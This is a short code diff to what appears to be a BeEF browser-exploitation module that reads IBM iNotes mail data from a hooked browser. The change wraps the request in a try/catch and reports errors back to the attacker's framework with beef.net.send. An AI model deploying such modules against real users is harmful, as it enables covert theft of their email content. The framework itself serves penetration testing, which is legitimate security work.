@@ -20,6 +20,8 @@ beef.execute(function() {
 	var currentURL = document.URL;
 	var rx = /(.*\.nsf)/g;
 	var arr = rx.exec(currentURL);
+
+try {
 	var notesURL = arr[1];
 	
 	var xhr = new XMLHttpRequest();
@@ -30,6 +32,11 @@ beef.execute(function() {
 		}
 	}
 	xhr.send(null);
+} catch(e) {
+	beef.debug("Error: " + e);
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Read iNotes Error: "+e);
+}
+
 });
 
 
